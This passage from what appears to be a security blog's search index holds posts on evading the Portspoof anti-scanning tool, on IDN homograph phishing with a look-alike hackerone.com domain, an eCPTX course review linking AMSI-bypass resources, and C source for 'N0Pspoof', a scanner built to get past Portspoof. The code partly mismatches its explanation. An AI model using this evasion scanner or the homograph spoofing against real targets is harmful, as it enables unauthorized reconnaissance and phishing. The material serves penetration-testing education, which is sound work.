huge value it will crash the Lua VM which running the app.   Conclusion  We can not fully admit that the Final Thoughts we discuss is the right or final one as we didn’t dig deep into and perform dynamic analysis. But, we would be analyzing it dynamically to fully verify the Final Thoughts. Also, it could be the same way but in another place or line of code.  ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/killzte/",
        "teaser": "http://localhost:5000/assets/images/clchacuknea7q0jp80bhnbgn2.jpg"
      },{
        "title": "Research: Evading Portspoof Solution",
        "excerpt":"Introduction   One of the opensource solutions caught my eyes before and it was preventing and making port scanning hard to be done against the target that running it. Now, we will discuss how to evade it.       What is portspoof ?   Portspoof is meant to be a lightweight, fast, portable and secure addition to the any firewall system or security system. The general goal of the program is to make the reconnaissance phase slow and bothersome for your attackers as much it is only possible. This is quite a change to the standard 5s Nmap scan, that will give a full view of your systems running services. (Read More)       Testing Lab   I used Ubuntu Server as a victim &amp; kali linux machine as attacker. If you faced any problems with installing Portspoof. You may install the needed packages/libraries:   sudo apt update sudo apt install gcc g++ make libc6-dev libc6-dev-i386       Installation           Note: Don't forget to run all commands as sudo in new versions of linux. So, you avoid problems You can install portspoof from the following blog. Click Here. or From the following commands:            Download Portspoof:       git clone https://github.com/drk1wi/portspoof.git      Compile Portspoof:   sudo ./configure &amp;&amp; make &amp;&amp; sudo make install           Now, the following commands are used in specific situations.                       The first one is to redirect all connections to portspoof    sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -mtcp --dport 1:65535 -j REDIRECT --to-ports 4444                        The second one is to redirect some range of ports and exclude the real running services ports, For example, the following command not including port 22 and 80    sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -m tcp -m multiport --dports 1:21,23:79,81:65535 -j REDIRECT --to-ports 4444                   Here is a bash script that you can use to configure and automate this process and don’t forget to exclude the real running services ports:   #!/bin/bash  spoofPorts=\"1:19 23:24 26:52 54:79 81:109 112:122 124:442 444:464 466:586 588:891 893:2048 2050:8079 8081:32800 32801:65535\"  for prange in ${spoofPorts}; do  iptables -t nat -A PREROUTING -i eth0 -p tcp -m tcp --dport ${prange} -j REDIRECT --to-ports 4444  done   This bash script sets up iptables rules to redirect incoming traffic on certain ports to port 4444 (Which is port spoof listening port). The variable “spoofPorts” contains a list of port ranges separated by spaces, in the format “startPort:endPort”. Then uses a for loop to iterate through each port range in the spoofPorts variable. For each iteration, the script runs the iptables command, which creates a new rule in the NAT table’s PREROUTING chain. The rule specifies that incoming traffic on interface eth0, using the TCP protocol, and destined for one of the ports in the current range, should be redirected to port 4444.       How Portspoof works ?   Portspoof got a huge number of signatures when you connect to any port as we configured before in iptables it will forward all connections to portspoof services and will response with [syn-ack] that the ports are open. Then we won’t be able to identify the real services. Also, portspoof is responsing with banners etc. So, its hard to identify the actual running real services. But, portspoof is not affecting the actual real running services ( as we configured in the bash script ).  Portspoof working steps:      1- Attacker perform port scanning using nmap   2- The victim machine look at the iptables rules and forward the connection to portspoof services   3- portspoof response with [syn-ack]   4- Nmap identify ports as open and running   5- attacker try to enumerate version of protocols &amp; banners   6- portspoof response based on the config &amp; signatures (which is fake)   7- Nmap output based on the portspoof response       Traffic Analysis   The following pictrue shows the normal nmap scan. Now, on this target at te moment ssh services are running on port 22.      So, if we used the tcp.port==22 filter in wireshark to take a look on how nmap identified the ssh as it’s running and it’s a real services.      We can see clearly that the normal scan of nmap, Just looking for any response from the target and then identify it as running/open.   But, if we tried other types scannings it will work (Not all types). For example Fin Scan, Null Scan.           Fin Scan:                       Open Port                                               Closed Port                                               Null Scan:                       Open Port                                               Closed Port                                  But, nmap and related scans are known and can be caught by any measure of defense like IDS/IPS. So, Let’s complete by doing it manually.       Evading Portspoof   We need to know how portspoof is dealing with our connections. So, we will be able to generate a bypass scenario. Lets try to connect manaual using netcat or telnet. I have used netcat but the connection were closed by the host without waiting any input from me for a reason.   netcat:          I tried telnet after that and the connection is closed by the host (victim):          As we can guess from this that portspoof just creating the banners and response and close the connection.   The victim got port 21 (ftp) open by default so lets try to connect it.              As you can see the real services didn’t close the connection. Then for sure the fake one close the connection. Steps to identify the real running services:   1- Connect to the service   2- if we receive data and services closed connection then its fake   3- if we received data and send any command and received another data then its real service or the connection didn't closed then it's a real service       Automate the process   We gonna automate the process using python and we gonna try it on FTP services. But, First lets try to scan with nmap.              As you can see its a miss and most of the ports identified as open and few as closed. So, we gonna use the following script to test it.   Script:      To avoid false positives we gonna use the commands of each protocol and we gonna try with ftp &amp; http protocols. The script is creating a connection with ftp services first, receive response then try to login with anonymous and receive the second response and save it in response variable. After that is comparing if the response contains the Login word cause when we try to login in FTP is printing Login word in each fail and success try. If the Login is exist it will identify the services as open else is gonna just pass it. The same for the HTTP services but its checking if the html word is exist in the response. Now let’s run it:          We got the ftp port as opened. Now you know how to bypass it you can write your tool on your own way to identify the services that you want or to identify if the connection is alive or no.       Conclusion   As we were able to see it was simple way to bypass it using the workflow or the logic behind it. Therefor, we will be able to break it with no doubts and reach the real used ports on the system and start our next steps in our Pentesting project.  ","categories": ["Defense Evasion"],
        "tags": [],
        "url": "http://localhost:5000/defense%20evasion/portspoof/",
        "teaser": "http://localhost:5000/assets/images/cld14ume532ci0jnx2vc40wct.png"
      },{
        "title": "Homograph Attack: Abusing IDNs for Phishing",
        "excerpt":"Introduction   In recent years, phishing and social engineering attacks have become a significant threat to businesses and individuals alike. These attacks are particularly dangerous because they target end-users directly, bypassing many traditional cyber security defenses such as firewalls, endpoint detection and response (EDR), and anti-virus software. To combat these threats, many companies have implemented phishing awareness training programs to educate employees on how to spot suspicious email attempts and protect themselves and the business from bad actors. However, even with user awareness, it can be difficult to limit or prevent certain types of attacks, such as homograph attacks, where the attacker uses seemingly legitimate websites or emails to trick the user.   What is phishing ?   Phishing is a type of social engineering attacks that uses deception to trick individuals into providing sensitive information such as login credentials or personal data. This type of attack typically occurs through email, telephone, or text message communication and is designed to appear legitimate in order to gain the trust of the victim. The attackers may use various tactics such as creating fake websites or emails that resemble legitimate sources, impersonating a trusted organization, or using urgent language to create a sense of urgency and pressure the victim into providing the requested information. The goal of these attacks is to steal sensitive information such as passwords, credit card numbers, or other personal data for financial gain or to gain access to sensitive systems and information.   Types of Phishing      Email Phishing   Email Phishing is a tactic used in penetration testing and red teaming engagements where an attacker targets a specific company or individual by gathering information through Open-source intelligence (OSINT). This type of attack involves researching the company, their interests, and the services they offer in order to appear legitimate and trick the target into taking a desired action. An example of this type of attack is Spear Phishing, where the attacker poses as someone searching for a job and targets the human resources department of the company. The attacker then tricks the HR representative into downloading a malicious file, such as a keylogger or spyware, which allows the attacker to gain access to sensitive information. The goal of Email Phishing is to gather information or gain access to a company’s systems through tricking the target into taking an action that they would not normally take.   Whaling Phishing   Whaling phishing is a specific type of phishing that targets individuals with high levels of access and permissions within an organization, such as the CEO. This tactic involves creating fake emails that appear to be from other individuals within the company, in order to gain sensitive information or access to important systems. The goal of whaling phishing is to take advantage of the trust and authority of high-level individuals in order to compromise the entire organization. To carry out a successful whaling phishing attack, an attacker may conduct extensive research on the targeted organization, known as OSINT (Open Source Intelligence). This research may include studying the roles, positions, and groups within the company, in order to identify potential targets and understand their access levels. Once the attacker has a good understanding of the organization, they may create fake emails that appear to be from other individuals within the company. These emails may contain malicious links or attachments, which, when clicked, can infect the target’s computer with malware or steal sensitive information. For example, imagine that the CEO of a company has local administrator access on the company’s system. An attacker may create a fake email that appears to be from a lower-level employee, requesting the CEO to click on a link or download a file. If the CEO falls for the trap and clicks on the link or download the file, the attacker can potentially gain access to the CEO’s computer and potentially the entire company’s system. In summary, whaling phishing is a tactic that targets high-level individuals within an organization, such as the CEO, with the goal of compromising the entire organization. It involves conducting extensive research on the targeted organization and creating fake emails that appear to be from other individuals within the company, in order to steal sensitive information or gain access to important systems.   Smishing Phishing   Smishing, also known as SMS phishing, is where the attacker sends text messages to the victim in order to obtain sensitive information or trick them into taking a specific action. Unlike traditional phishing attacks, which are delivered through email, smishing attacks are delivered through text messages on a victim’s mobile device. The attacker may obtain the victim’s phone number through an old data breach or other means, making it easy for them to target the victim. One of the advantages of smishing is that it does not require an internet connection. This means that even if the victim is on vacation or in an area with limited internet access, they can still be targeted by the attacker. Additionally, the victim may be more likely to respond to a text message than an email, as text messages are typically considered more urgent and personal. However, it is important to note that smishing can be just as dangerous as traditional phishing attacks. The victim may be tricked into providing sensitive information, such as login credentials or financial information, or they may be directed to a malicious website that can infect their device with malware. Therefore, it is important for individuals and organizations to be aware of the risks of smishing and to take appropriate measures to protect themselves.   Vishing Phishing   Vishing, also known as voice call phishing, is where the threat actor contacts the victim or targeted person via phone call. The attacker may use phone numbers over IP (Internet Protocol) if they have already gained access to them. This method of phishing is considered harder compared to others, as the attacker must have a well-planned and convincing story in order to obtain the desired information from the victim without arousing suspicion. One benefit of vishing is that the outcome of the attack is often faster than email phishing, as the attacker does not need to wait for a file or email to be opened or clicked. It is important to note that there is often confusion between phishing and spear phishing. The main difference between the two is that spear phishing targets specific groups or organizations, such as individuals with specific positions that have access to sensitive systems.   What is IDN’s ?   International Domain Names (IDNs) are a solution to the problem of the limited character set of the early days of the World Wide Web’s Domain Name System (DNS). The DNS root originally only supported Latin letters A-z and digits. However, with over 6000 languages spoken worldwide, it became clear that support for non-Latin alphabets such as Cyrillic and Arabic was necessary. IDNs were created to address this issue and make the DNS root more inclusive and accessible for speakers of non-Latin languages. Additionally, IDNs also play a significant role in Homograph attacks, that uses visually similar characters to trick users into visiting malicious websites.   IDN Homograph Attack   An IDN Homograph Attack is an attack that utilizes the Internationalized Domain Name (IDN) feature to manipulate letters in different languages. The IDN feature allows for the use of non-Latin characters in domain names, which can be used to create a spoofed version of a legitimate domain that looks very similar to the original. This can be used to trick victims into providing sensitive information, such as login credentials or personal information, through phishing emails or other means. In a demonstration of an IDN Homograph Attack, an attacker may use a tool such as the Homoglyph Attack Generator (https://www.irongeek.com/homoglyph-attack-generator.php) to create a spoofed version of a trusted domain. For example, the attacker may create a domain that looks like “hackerone.com” but uses non- Latin characters that are visually similar to the letters “h”, “a”, “c”, “k”, “e”, “r”, “o”, “n” and “e”. The victim may not realize that the domain is different from the legitimate “hackerone.com” and may enter their login credentials or personal information, allowing the attacker to steal their information.      As you can observe in the picture, we utilized characters from a different language, specifically “cyrillic” letters, to create a domain name that appears similar to “hackerone.com”. However, it is important to note that the domain name in question, һackеrone.com, is not the same as the legitimate domain “hackerone.com”.      And here is the domain available as we can see:      By using the domain support@hackerone.com as the original domain, in order to steal their HackerOne account. This is a simple simulation of this type of attack and it can be used in different scenarios, depending on the target. This attack is specifically found in common browsers like Google Chrome, specifically in version 58 and Chromium-based browsers, but it also exists in Firefox. However, we will cover how to limit the risk of this attack in Firefox as well.   What is punycode ?   Punycode is a method of encoding Unicode characters in the ASCII character set. Unicode is a standardized system of representing characters and symbols from different languages and scripts, while ASCII is a standardized set of characters and symbols used in computer systems. Punycode allows the use of Unicode characters in domain names and URLs, which are typically limited to the ASCII character set. The process of converting Unicode characters to Punycode involves a series of steps. First, the Unicode characters are divided into basic and non-basic characters. Basic characters are those that are already included in the ASCII character set, while non-basic characters are those that are not. Next, the non-basic characters are assigned a unique code point, which is a numerical value that represents the character. The code point is then converted to a series of ASCII characters using a specific algorithm. These ASCII characters are then prepended with the prefix xn– , which indicates that the characters following it are Punycode encoded. When a user enters a Punycode encoded URL, the browser will convert the Punycode back to Unicode characters and display the correct characters on the screen. An example of Punycode in action is the domain name xn– d1acufc.xn–p1ai , which is the Punycode version of the Russian domain name рф.рф (rf.rf) . In this example, the non-ASCII characters р and ф have been encoded in Punycode, allowing them to be used in the domain name. In summary, Punycode is a method of encoding Unicode characters, which are used in different languages and scripts, into the ASCII character set, which is widely used in computer systems. This allows the use of Unicode characters in domain names and URLs, which would otherwise not be possible.   Limit the attack   In order to limit the risk of attack in Firefox browser, there are a few steps you can take. First, open your Firefox browser and type about:config in the address bar and enable it:      The attack fixed in some common used browsers, but it’s still exist in firefox. We will cover blow how to limit the risk of this attack in firefox &amp; Goolge.   Prevent and Detect homograph attack and HTTP spoofing   HTTP spoofing is an attack in which an attacker creates a fake website that looks identical to the original website. This can be done by using SSL certificates to make the fake website appear secure and trustworthy. However, it is important to pay attention to the certificate information to confirm the owner of the domain and website. To prevent and mitigate this type of attack, it is recommended to disable punycode in the address bar as most modern browsers have this feature. When punycode is disabled, the user will see the punycode as unicode, making it easier to identify suspicious websites. Additionally, using third-party tools such as virustotal can also help to check the authenticity of a website’s URL.      Conclusion   In conclusion, phishing and social engineering attacks are a significant threat to businesses and individuals alike. These attacks target end-users directly and bypass traditional cyber security defenses. To combat these threats, many companies have implemented phishing awareness training programs to educate employees on how to spot suspicious email attempts and protect themselves and the business from bad actors. However, even with user awareness, it can be difficult to limit or prevent certain types of attacks, such as homograph attacks. Email Phishing, Spear Phishing, and Whaling Phishing are some of the types of phishing that can be used by attackers to gain sensitive information or access to important systems. It is important for organizations and individuals to be aware of these tactics and to take necessary precautions to protect themselves and their data from phishing attacks.  ","categories": ["General"],
        "tags": [],
        "url": "http://localhost:5000/general/idns/",
        "teaser": "http://localhost:5000/assets/images/df598d77a88828a214046fa52c5926a7.png"
      },{
        "title": "eCPTX: The Honest Review",
        "excerpt":"Introduction  On June 17th, 2022, I successfully completed the eCPTX exam from eLearnsecurity and received my certification. At the time, I was working and had a lot of responsibilities, so I didn’t have a chance to study the course material beforehand. Instead, I relied on my previous experience and what gathered &amp; used it during the exam. I will now provide an honest review of the eCPTX overall and in more details than the eCPPT, Cause there are a lot of things. Doesn’t make sense i saw in other ppls review.   Course Content  For the eCPTX course content i was dissapointed with a lot of stuff. The content as the following:      Penetration Testing: Preparing the Attack   Penetration Testing: Red Teaming Active Directory   Penetration Testing: Red Teaming Critical Domain Infrastructure   Penetration Testing: Evasion   Penetration Testing: Preparing the Attack  In this part it was all about email security and phishing. You will learn about Email security like SPF, DKIM, DMARC. In addition to phishing attacks and ways to use macros &amp; will show you study cases of macros used by APTs. Finally, C2 and redirectors. You think it’s cool right ? No, Cause if someone have no idea about macros actually or VBAs will not be able to understand and a lot of things will fall while learning. Side by that the module shall teaches you. How to develope Macros to use in your engegment. But, all what i saw was study cases and methods without writing any Macros. So, we can say that this section is showing you knowledge or giving you some knowledge. In the video related to this section, It shows how to get used codes and use it again by modifying it it's Good point but it will be hard to work with the modern solutions. In summary, In my opinion it was gonna better to teach how to develop macros from scratch up to advanced level as this certificate under the Red Teaming part. But, it still have good topics like the redirectors, But also still not everything explained clear in this section. But, at all if you are fimiler with these topics and have pervious knowledge about it you gonna find that it’s all fine with you.   Penetration Testing: Red Teaming Active Directory  I can say the real fun starts here as this section doesn’t have a lot of unclear things. But, in my opinion the only thing that i didn’t like is that in the first part in this section which was Advanced Active Directory Reconnaissance &amp; Enumeration. They didn’t cover what is active directory first or it’s basics. But, it’s in the second part/pdf. So it shall be in the first PDF. But, it discuss how to start enumerate and obtain information from non-joined machine which is something good &amp; Also attacking joined Linux machine in the AD, which is not common for people to talk about. In the second PDF which is Red Teaming Active Directory it was cool actually and here started by explaining The Active Directory enviroment, Moving to the Attacks of tradntial Active Directory attacks like LLNMR Poisioning, Downgrading NTLM and more.Then talking about Powershell defense and bypasses, Abusing active directory features and components, Moving laterly, Browser Pivoting and many more.   Penetration Testing: Red Teaming Critical Domain Infrastructure  This section talking about used components and services in windows like MS Exchange, WSUS &amp; MSSQL. it does not have that much of information but it’s fine to learn from it and you can find other blog series online talking in much more details would help you also you could find online abusing for something like SCCM.   Penetration Testing: Evasion  In this section explained about  the AMSI archticture and some bypasses moving to other methods and components like Sensitive groups that solutions can use it for detection, also other solutions like EDRs and techniques to bypass and evading, After that developing a custom payload which i can say is a good one. Finally, The most section i liked in the course is the second section and i explained why. My final words is if the course relied on using and abusing built-in commands, functions and features for abusing as example, It would be absoulotly an amazing content as it will reduce the detection in the real-world engement.   The Exam  Now, Let’s talk about the exam. But, before this i wass mention something and it’s when i searched for reviews for the eCPTX, I found onething common between most of the people that go through the exam, Which is some of them fail cause they had to find 3 paths or 3 ways to access the targeted doamin, But, the funny part here if you go throught the RoE(Rules of engegment) You can clearly see in the document that it’s telling one of the rules to bypass is to identify 3 ways to access the targeted domain. And others saw it as a really hard exam. But at all, As i mentiond before i toke the exam and passed without studying the content (That doesn't mean i am 1337 \"elite\" I'm giving my opinion honestly and what i see from my point of view), You may find content so wow and amazing, Therefore, th exam will be extrem hard. But, no exam was normal and if you have deal with .net stuff and reverse some of it it would be easy for you. For me i was reversing the .dll files from unity games in the past to modify it. So, I can say exam was nomal not too easy and not too hard &amp; It’s really was gonna be hard if we applied all what the content teach and i would be failing in it. For the exam environment you would face some issues, For exmaple, you could try to abuse an attack, But will not work and when you restart the exam lab, the try again. It will work. At the end Thanks for taking to read and if you want to add books to read i would recommand books like Anti-Virus Bypass techniques, The Hacker Playbook 3, Advanced Infrastructure Penetration Testing .   Resources   Red Team Infrastructure &amp; Macros     Malicious Macros for Script Kiddies: https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/   Red-Team-Infrastructure-Wiki: https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki   Red Team Infrastructure: https://www.ired.team/offensive-security/red-team-infrastructure   How To: Build Inexpensive Red Team Infrastructure: https://secprentice.medium.com/how-to-build-inexpensive-red-team-infrastructure-dfb6af0fe15d   Modern Red Team Infrastructure: https://www.netspi.com/blog/technical/adversary-simulation/modern-red-team-infrastructure/   Introducing Red Ira - Red Team Infrastructure Automation Suite: https://blog.joeminicucci.com/2021/redira   Active Directory and lateral movement     Build an Active Directory Lab: https://lnkd.in/dZPRibiM https://lnkd.in/eJkemDbg https://lnkd.in/ezHnzsp7 https://lnkd.in/ezf6K4zq https://lnkd.in/e69QStmp https://lnkd.in/et4SAjNS https://lnkd.in/eVC_xvPq https://lnkd.in/eNBNUA8s https://lnkd.in/eiFW9WzU https://lnkd.in/eNUnu7w9 https://lnkd.in/ejXTb64P  https://lnkd.in/e5Y7mB2t https://lnkd.in/eZVi5Vh6 https://lnkd.in/estQMaYe  https://lnkd.in/ecmWPtBS   Attacking Active Directory: https://h4ms1k.github.io/Red_Team_Active_Directory/ https://lnkd.in/e6ZVK87z https://lnkd.in/eCfgYz-a https://lnkd.in/eF3Dezy5  https://lnkd.in/eb9SmWdF https://lnkd.in/ezdUiEcg https://lnkd.in/ei7vAjbW   Lateral Movement Windows and Active Directory https://lnkd.in/gbkTHugi   Understanding_Windows_Lateral_Movements (attl4s) https://lnkd.in/g–78ZuG   Windows Red Team Lateral Movement Techniques https://lnkd.in/guASjcin   Attacking Windows: Performing Lateral Movement with Impacket https://lnkd.in/g9zZFnc8   Lateral Movement Using DCOM Objects and C# https://lnkd.in/g27HFYw6   Windows Lateral Movement¶ https://lnkd.in/gNA8FUQg   Windows Lateral Movement with smb, psexec and alternatives https://lnkd.in/g-FYrZbf   Offensive Lateral Movement https://lnkd.in/geNF_iTY   Misc https://mrw0r57.github.io/ https://lnkd.in/g7RMVNEM   Attacking MSSQL, WSUS, Exchange and SCCM     MSSQL AD Abuse: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql   Abusing SQL Server Trusts in a Windows Domain: https://www.pentesteracademy.com/course?id=35   MSSQL for Pentester: Abusing Trustworthy: https://www.hackingarticles.in/mssql-for-pentester-abusing-trustworthy/   MSSQL Penetration Testing: https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet   Exchange pnetest: https://github.com/kh4sh3i/exchange-penetration-testing   Red Teaming MS SQL Server: https://h4ms1k.github.io/Red_Team_MSSQL_Server   Red Team exchange: https://h4ms1k.github.io/Red_Team_exchange   WSUS: https://www.gosecure.net/?s=WSUS, https://www.youtube.com/results?search_query=Abusing+WSUS   Red Teaming WSUS: https://h4ms1k.github.io/Red_Team_WSUS   Evasion     AMSI Bypass Methods: https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/ Introduction   AMSI Bypass and Evasion: https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/   Exploring PowerShell AMSI and Logging Evasion: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/  ","categories": ["Certificates"],
        "tags": [],
        "url": "http://localhost:5000/certificates/ecptx/",
        "teaser": "http://localhost:5000/assets/images/acd15cf82491cabb174171df916cfc20.png"
      },{
        "title": "Exploit Writing (N0Pspoof): Portspoof Evasion",
        "excerpt":"Introduction   In the previous blog (Read Here), Portspoof explained well and how we can abuse it’s logic to bypass it. Now, it’s the time to write a full exploit to take advantaged of it and scan a range of ports.       Writing Our tool   Header files   These are all C header files that are being included in the code. Each of them contains declarations for functions, variables and types that are used in the code that follows.   #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/time.h&gt; #include &lt;errno.h&gt;           #include &lt;sys/socket.h&gt;: This header file contains the definitions of the socket-related data types, structures, and functions needed for socket programming. It includes the definitions for creating and manipulating sockets, as well as functions for interacting with the underlying transport protocol (typically TCP or UDP).            #include &lt;arpa/inet.h&gt;: This header file contains the definitions for internet operations such as IP addresses, port numbers, and protocol families. It provides functions to convert between human-readable and network-readable addresses, and also defines constants for common internet protocols such as TCP and UDP.            #include &lt;unistd.h&gt;: This header file provides various system calls and library functions that are used for performing basic file and process management operations in POSIX systems, like read, write, close, sleep, getpid, etc.            #include &lt;string.h&gt;: This header file contains a set of functions to manipulate arrays of characters, such as strcmp, strcpy, strlen, etc.            #include &lt;sys/time.h&gt;: This header file provides functions and data structures for measuring time, like gettimeofday, timeval, timespec, etc.            #include &lt;errno.h&gt;: This header file contains the global variable errno, which is set by various library functions and system calls to indicate the error that occurred during their execution. It also contains some commonly used error codes and macros.               Scanning Functions      TCP   void TCP_scan(char* host, int start_port, int end_port, struct timeval timeout) {     for (int port = start_port; port &lt;= end_port; port++) {         int sock = socket(AF_INET, SOCK_STREAM, 0);         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeout, sizeof timeout);         struct sockaddr_in server;         server.sin_addr.s_addr = inet_addr(host);         server.sin_family = AF_INET;         server.sin_port = htons(port);          if (connect(sock, (struct sockaddr *) &amp;server, sizeof(server)) == 0) {             char buffer[32];             int bytes_sent = send(sock, buffer, sizeof(buffer), 0);             if (bytes_sent &gt; 0) {                 int bytes_received = recv(sock, buffer, sizeof(buffer), 0);                 if (bytes_received &gt; 0) {                     printf(\"[+] Port %d is open\\n\", port);                 } else if (bytes_received == -1 &amp;&amp; errno == EAGAIN) {                     printf(\"[+] Port %d is open\\n\", port);                 }             }             close(sock);         } else {             //printf(\"[+] Port %d is closed\\n\", port);         }         close(sock);     } }       The TCP function takes four parameters:           host: a char pointer to the hostname or IP address of the target machine.            start_port: an integer representing the start of the port range to be scanned.            end_port: an integer representing the end of the port range to be scanned.            timeout: a struct timeval representing the timeout for the receive operation.               The function starts a for loop that iterates through all the ports in the specified range. For each port, it creates a new socket using the socket() function, with the AF_INET parameter for IPv4 addresses, SOCK_STREAM for TCP protocol,Then sets the timeout value for the socket using the setsockopt() function with the SOL_SOCKET and SO_RCVTIMEO options. Next, the function creates a struct sockaddr_in called server, which is used to store the host’s IP address and port number. The function converts the host’s IP address to a 32-bit number using inet_addr() and sets the sin_addr.s_addr field of the server struct. The sin_family field is set to AF_INET and the sin_port field is set to the current port number in the for loop, converted to network byte order using htons(). The function then creates a buffer and sends an empty packet to the server using the sendto() function. If the sendto() function returns a value greater than 0, it means that the packet was sent successfully. Then uses the recv() function to receive a response from the server. If the recv() function returns a value greater than 0, it means that there is an open port, and the function prints a message indicating that the port is open. If the recv() function returns -1 and the errno value is EAGAIN, it means that the response timed out and the port is open. Finally, the function closes the socket using the close() function. The function repeats the process for all the ports in the specified range.          UDP   void UDP_scan(char* host, int start_port, int end_port, struct timeval timeout) {     for (int port = start_port; port &lt;= end_port; port++) {         int sock = socket(AF_INET, SOCK_DGRAM, 0);         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeout, sizeof timeout);         struct sockaddr_in server;         server.sin_addr.s_addr = inet_addr(host);         server.sin_family = AF_INET;         server.sin_port = htons(port);         char buffer[32];         int bytes_sent = sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&amp;server, sizeof(server));         if (bytes_sent &gt; 0) {             int bytes_received = recv(sock, buffer, sizeof(buffer), 0);             if (bytes_received &gt; 0) {                 printf(\"[+] Port %d is open\\n\", port);             } else if (bytes_received == -1 &amp;&amp; errno == EAGAIN) {                 printf(\"[+] Port %d is open\\n\", port);             }         } else {             //printf(\"[+] Port %d is closed\\n\", port);         }         close(sock);     } }       The UDP function takes four parameters:           host: a char pointer to the hostname or IP address of the target machine.            start_port: an integer representing the start of the port range to be scanned.            end_port: an integer representing the end of the port range to be scanned.            timeout: a struct timeval representing the timeout for the receive operation.               The function starts a for loop that iterates through all the ports in the specified range. For each port, it creates a new socket using the socket() function, with the AF_INET parameter for IPv4 addresses, SOCK_DGRAM for UDP protocol, and a value of 0 for the protocol.Then sets the timeout value for the socket using the setsockopt() function with the SOL_SOCKET and SO_RCVTIMEO options. Next, the function creates a struct sockaddr_in called server, which is used to store the host’s IP address and port number. The function converts the host’s IP address to a 32-bit number using inet_addr() and sets the sin_addr.s_addr field of the server struct. The sin_family field is set to AF_INET and the sin_port field is set to the current port number in the for loop, converted to network byte order using htons(). The function then creates a buffer and sends an empty packet to the server using the sendto() function. If the sendto() function returns a value greater than 0, it means that the packet was sent successfully. Then uses the recv() function to receive a response from the server. If the recv() function returns a value greater than 0, it means that there is an open port, and the function prints a message indicating that the port is open. If the recv() function returns -1 and the errno value is EAGAIN, it means that the response timed out and the port is open. Finally, the function closes the socket using the close() function. The function repeats the process for all the ports in the specified range.       Main function   int main() {     char host[256];     int start_port, end_port;     struct timeval timeout;     timeout.tv_sec = 5;         timeout.tv_usec = 0;     int scan_type;     printf(\"[+] N0Pspoof is a tool to bypass and evade Portspoof solution \\n\");     printf(\"[+] By: Zeyad Azima\\n\");     printf(\"[+] Github: https://github.com/Zeyad-Azima/N0Pspoof\\n\");     printf(\"\\n\");     printf(\"[+] Target Behind Portspoof: \");     scanf(\"%255s\", host);      printf(\"[+] Enter the start port: \");     scanf(\"%d\", &amp;start_port);     printf(\"[+] Enter the end port: \");     scanf(\"%d\", &amp;end_port);      printf(\"[+] Choose the scan type: \\n 1) TCP \\n 2) UDP \\n\");     scanf(\"%d\", &amp;scan_type);     printf(\"\\n\");                if (scan_type == 1) {         printf(\"[+] Scan Info:\\n[*] Target: %s\t[*] Ports Range: %d-%d\t[*] Scan Type: TCP\\n\", host, start_port, end_port);         TCP_scan(host, start_port, end_port, timeout);     } else if (scan_type == 2) {         printf(\"[+] Scan Info:\\n[*] Target: %s\t[*] Ports Range: %d-%d\t[*] Scan Type: UDP\\n\", host, start_port, end_port);         UDP_scan(host, start_port, end_port, timeout);     } else {         printf(\"Invalid scan type\\n\");     }     return 0;  }               host: is an array of characters with a maximum size of 256, which will be used to store the target host entered by the user.            start_port: and end_port: are integers that will be used to store the start and end ports entered by the user.            timeout: is a struct of type timeval, which is used to store the timeout value for the scan. The struct has two members: tv_sec and tv_usec. In this case, tv_sec is set to 5 indicating that the timeout for the scan is 5 seconds. tv_usec is set to 0, indicating that the timeout is in seconds and not microseconds.            scan_type: is an integer that will be used to store the scan type chosen by the user.           When the code starts it prompts for the user to enter the target host, start and end ports, and scan type. The user input is stored in the variables:           host            start_port            end_port            scan_type       Then checks the value of scan_type using an if-else statement. If the value of scan_type is 1, it means the user has chosen a TCP scan, and the program will call the TCP_scan function, passing in the host, start and end ports, and the timeout value. If the value of scan_type is 2, it means the user has chosen a UDP scan, and the program will call the UDP_scan function, passing in the host, start and end ports, and the timeout value. If the value of scan_type is not 1 or 2, it means the user has entered an invalid scan type, and the program will display an error message.       Full Code:   #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/time.h&gt; #include &lt;errno.h&gt;  void TCP_scan(char* host, int start_port, int end_port, struct timeval timeout) {     for (int port = start_port; port &lt;= end_port; port++) {         int sock = socket(AF_INET, SOCK_STREAM, 0);         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeout, sizeof timeout);         struct sockaddr_in server;         server.sin_addr.s_addr = inet_addr(host);         server.sin_family = AF_INET;         server.sin_port = htons(port);          if (connect(sock, (struct sockaddr *) &amp;server, sizeof(server)) == 0) {             char buffer[32];             int bytes_sent = send(sock, buffer, sizeof(buffer), 0);             if (bytes_sent &gt; 0) {                 int bytes_received = recv(sock, buffer, sizeof(buffer), 0);                 if (bytes_received &gt; 0) {                     printf(\"[+] Port %d is open\\n\", port);                 } else if (bytes_received == -1 &amp;&amp; errno == EAGAIN) {                     printf(\"[+] Port %d is open\\n\", port);                 }             }             close(sock);         } else {             //printf(\"[+] Port %d is closed\\n\", port);         }         close(sock);     } }  void UDP_scan(char* host, int start_port, int end_port, struct timeval timeout) {     for (int port = start_port; port &lt;= end_port; port++) {         int sock = socket(AF_INET, SOCK_DGRAM, 0);         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeout, sizeof timeout);         struct sockaddr_in server;         server.sin_addr.s_addr = inet_addr(host);         server.sin_family = AF_INET;         server.sin_port = htons(port);         char buffer[32];         int bytes_sent = sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&amp;server, sizeof(server));         if (bytes_sent &gt; 0) {             int bytes_received = recv(sock, buffer, sizeof(buffer), 0);             if (bytes_received &gt; 0) {                 printf(\"[+] Port %d is open\\n\", port);             } else if (bytes_received == -1 